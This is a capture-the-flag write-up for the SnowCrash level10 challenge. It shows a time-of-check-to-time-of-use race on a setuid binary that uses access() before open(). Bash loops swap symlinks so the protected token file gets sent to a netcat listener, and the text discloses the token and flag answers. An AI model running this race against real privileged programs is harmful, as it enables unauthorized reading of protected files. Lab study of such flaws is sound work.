
## level10
Upon enumeration, looks like this has similar mechanism with the last level, with another layer of complexity

```
level10@SnowCrash:~$ ls
level10  token
level10@SnowCrash:~$ file *
level10: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped
token:   regular file, no read permission
level10@SnowCrash:~$ ./level10 ^C
level10@SnowCrash:~$ ltrace ./level10 asdf
__libc_start_main(0x80486d4, 2, 0xbffff7e4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
)                = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++
level10@SnowCrash:~$ ./level10 asdf
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 ./level10 asdf
```

I wanted to get to know more about this mechanism so I opened another terminal to act as my server using ` nc -l 0.0.0.0 6969`

In my original terminal, I sent a test file to `127.0.0.1` to see its behaviour

Original terminal:
```
level10@SnowCrash:/dev/shm$ ./level10 script.py 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:/dev/shm$
```

Other terminal:
```
level10@SnowCrash:~$ nc -l 0.0.0.0 6969
.*( )*.
bytes = [102,52,107,109,109,54,112,124,61,130,127,112,130,110,131,130,68,66,131,68,117,123,127,140,137] # get from od -t u1
for x, byte in enumerate(bytes) :
    bytes[x] -= x
print(''.join(chr(i) for i in bytes))

level10@SnowCrash:~$
```

Looks like the file gets sent in plaintext, now I gotta find a way to access the file to get it sent through. The ltrace shows this line before the file gets read, so I went to see what it is about in the man page.
```
access("token", R_OK)                   = -1 EACCES (Permission denied)
```

as it turns out, there is a warning about a security hole
>  Warning: Using these calls to check if a user is authorized to,
       for example, open a file before actually doing so using open(2)
       creates a security hole, because the user might exploit the short
       time interval between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be
       avoided.  (In the example just described, a safer alternative
       would be to temporarily switch the process's effective user ID to
       the real ID and then call open(2).)
    
This means that we can change the file behaviour after access has been called, and before open has been called. We need to change the file in such a way that it passes the first `access` call and opens the `token` file on the `open` call.

And since we couldnt do anything to stop or pause the execution externally, we will need to do the file operation alot of times in succession, hoping that the timing reaches our favour.

The operations which we will do to the file is to 
1. create a link to a readable file 
2. remove the link
3. create a link to the non readable file
4. remove the link

Hopefully, when we continiously run the application in another thread, the `access` will run before step 2, and open will run before step 4.

We made a script to do the linking operations
```bash=
echo stuff > /dev/shm/stuff
while true
do
ln -s /dev/shm/stuff /tmp/link
rm -f /tmp/link
ln -s /home/user/level10/token /tmp/link
rm -f /tmp/link
done
```

Also another script to run the program in a loop
```bash=
while true
do
/home/user/level10/level10 /tmp/link 127.0.0.1
done
```

The following link will start a local server that listens to a port and restarts everytime a connection closes `nc -lk 0.0.0.0 6969`

Do the following in order : 
1. Run the server
2. Run the linking script
3. Run the program loop

You should able to see the value of token sometimes in the server output. 

The value of the token is `woupa2yuojeeaaed06riuj63c`, which is the password for flag10. The `getflag` output for that user is `feulo4b72j7edeahuete3no7c`
